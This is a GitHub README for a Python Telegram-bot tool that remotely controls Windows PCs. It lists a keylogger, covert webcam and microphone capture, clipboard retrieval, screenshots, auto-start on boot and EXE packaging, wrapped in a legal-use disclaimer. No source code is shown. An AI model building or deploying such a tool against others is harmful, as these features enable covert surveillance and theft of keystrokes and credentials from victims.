# TelegramPC Guardian

## ⚠️ DISCLAIMER

**WARNING:** This project is intended solely for educational purposes and legal use on your own devices.

- Using this software for unauthorized access to other people's computers is **ILLEGAL**
- The author is not responsible for any misuse of this tool
- Use only on devices you own or have explicit permission to manage
- Ensure your use complies with local laws and regulations

## 📋 Description

TelegramPC Guardian is a remote PC control tool via Telegram bot. It allows you to control your computer, get system information, take screenshots, record audio, and much more.

## ✨ Features

- 📊 System information (PC name, IP addresses, OS)
- 📸 Screen screenshots
- 📷 Webcam photos
- 🎤 Microphone audio recording
- ⌨️ Keylogger (keystroke logging)
- 📋 Clipboard content retrieval
- 🎵 Audio file playback
- 🖼️ Fullscreen image display
- 🎬 Video playback
- 🌐 Website monitoring
- 🚀 Auto-start on system boot

## 🛠️ Installation

### Requirements

- Python 3.8+
- Windows OS
- Telegram bot token

### Installation Steps

1. Clone the repository:
```bash
git clone https://github.com/DarkFimoz/TelegramPC-Guardian.git
cd TelegramPC-Guardian
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Configure the bot:
   - Open `remote_control.py`
   - Replace `BOT_TOKEN` with your bot token (get it from [@BotFather](https://t.me/BotFather))
   - Replace `CHAT_ID` with your Telegram ID (get it from [@userinfobot](https://t.me/userinfobot))

4. Run the program:
```bash
python remote_control.py
```

## 📱 Bot Commands

- `/start` - List all commands
- `/info` - System information
- `/screenshot` - Take a screenshot
- `/photo` - Take a photo from camera
- `/record <seconds>` - Record audio (default 10 sec)
- `/keylog_start` - Start keylogger
- `/keylog_stop` - Stop keylogger and get log
- `/keylog_get` - Get current log without stopping
- `/get_clipboard` - Get clipboard content
- `/stop_music` - Stop music playback

### Media Handling

- Send a voice message - plays automatically
- Send an audio file with caption `/start_music` - plays music
- Send a photo with caption `/start_photo <seconds>` - displays fullscreen
- Send a video with caption `/start_video` - plays video

## 🔨 Building to EXE

To create an executable file, use `build.py`:

```bash
python build.py
```

The compiled file will appear in the `dist/` folder.

## 📄 License

This project is distributed under the MIT License with additional conditions:

When creating forks or modifications, you **must**:

1. Credit the original author: **DarkFimoz**
2. Add a link to the original repository: https://github.com/DarkFimoz/TelegramPC-Guardian
3. Keep this notice in the README

See the [LICENSE](LICENSE) file for the full license text.

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📞 Contact

Author: **DarkFimoz**

Repository: https://github.com/DarkFimoz/TelegramPC-Guardian

---

**Remember:** Use this tool responsibly and only for legal purposes!
